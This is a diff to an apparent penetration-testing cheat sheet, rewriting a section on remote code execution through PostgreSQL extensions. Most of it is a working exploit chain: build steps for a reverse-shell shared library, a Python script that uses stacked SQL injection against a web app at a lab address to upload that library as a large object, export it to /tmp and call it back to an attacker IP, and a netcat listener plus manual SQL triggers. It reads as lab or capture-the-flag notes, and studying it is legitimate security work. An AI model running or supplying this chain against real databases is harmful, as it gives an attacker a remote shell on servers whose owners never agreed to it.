@@ -716,18 +716,57 @@ COPY tmp FROM PROGRAM 'id';
 SELECT * FROM tmp;
 DROP TABLE tmp;
 ```
+# RCE with PostgreSQL Extensions
 
-**RCE with Extensions:**
+This guide outlines the process for achieving Remote Code Execution (RCE) by leveraging PostgreSQL extensions.
 
-```bash
-sudo apt install postgresql-server-dev-13 gcc
+## 1. Preparing the Development Environment
+
+Since the compiled library must match the PostgreSQL version running on the target, it is recommended to use Docker to ensure environmental consistency.
+
+### Build the Environment
+
+Bash
+
+```
+# Create the Dockerfile
+cat << EOF > Dockerfile
+FROM postgres:13
+RUN apt-get update && \
+    apt-get install -y postgresql-server-dev-13 build-essential && \
+    rm -rf /var/lib/apt/lists/*
+EOF
+
+# Start Docker and build the image
+sudo systemctl start docker
+sudo docker build -t pg13-dev .
+```
+
+### Compile the Shared Object (.so)
+
+Run a container with your current directory mounted to compile the code:
+
+Bash
+
+```
+# Run the container
+sudo docker run -it -v "$(pwd)":/root --entrypoint bash pg13-dev
+
+# Inside the container, compile the payload
+cd /root
 gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
-nc -nvlp 443
+exit
+```
 
-#script for chunking data and sending them 
+## 2. Exploitation Script
+
+This Python script automates the process of uploading the compiled `.so` file into PostgreSQL using Large Objects, then creating a user-defined function to trigger the reverse shell.
+
+Python
+
+```python
 import requests  
 import random  
-import string  
 from urllib.parse import quote_plus  
 import math  
   
@@ -735,7 +774,7 @@ BASE_URL = "http://10.129.204.251:8080"
 LHOST = "10.10.16.58"  
 LPORT = 4444  
 USERNAME = "admin"  
-PASSWORD = "123123" # Replace it with password used when reseting the password of the admin user  
+PASSWORD = "123123" # Replace with valid password
   
 s = requests.Session()  
 r = s.post(  
@@ -747,7 +786,7 @@ r = s.post(
 if "My Passwords</h1>" in r.text:  
     print("[*] Logged in")  
 else:  
-    print("Could not log in. Check the credentials!\nUse the same password when you reset it for the admin user.")  
+    print("Could not log in. Check the credentials!")  
     exit(1)  
   
 def oracle(s, q):  
@@ -758,19 +797,20 @@ def oracle(s, q):
     )  
     return "Password edited!" in r.text  
   
-with open("pg_rev_shell.so","rb") as f:  
+with open("pg_rev_shell.so", "rb") as f:  
     raw = f.read()  
   
-loid = random.randint(50000,60000)  
+loid = random.randint(50000, 60000)  
 oracle(s, f"1;SELECT lo_create({loid})--")  
 print(f"[*] Created large object with ID: {loid}")  
   
+# Chunking data for upload
 for pageno in range(math.ceil(len(raw)/2048)):  
     page = raw[pageno*2048:pageno*2048+2048]  
-    print(page)  
     print(f"[*] Uploading Page: {pageno}, Offset: {pageno*2048}")  
     oracle(s, f"1;SELECT lo_put({loid}, {pageno*2048}, decode($${page.hex()}$$,$$hex$$))--")  
   
+# Triggering execution
 query  = f"1;SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"  
 query += f"SELECT lo_unlink({loid});"  
 query += "DROP FUNCTION IF EXISTS rev_shell;"  
@@ -779,11 +819,20 @@ query += f"SELECT rev_shell($${LHOST}$$, {LPORT})--"
 oracle(s, query)
 ```
 
-```sql
-CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
-SELECT rev_shell('127.0.0.1', 443);
+## 3. Final Execution Steps
+
+1. **Set up Listener:** Open a terminal on your attacking machine to catch the reverse shell:
+    
+
+nc -nvlp 4444
+
 ```
 
+2. **SQL Execution:** If performing the steps manually via a SQL prompt, use the following commands:
+   ```sql
+   CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
+   SELECT rev_shell('PWNIP', PWNPORT);
+```
 ---
 
 ## MySQL
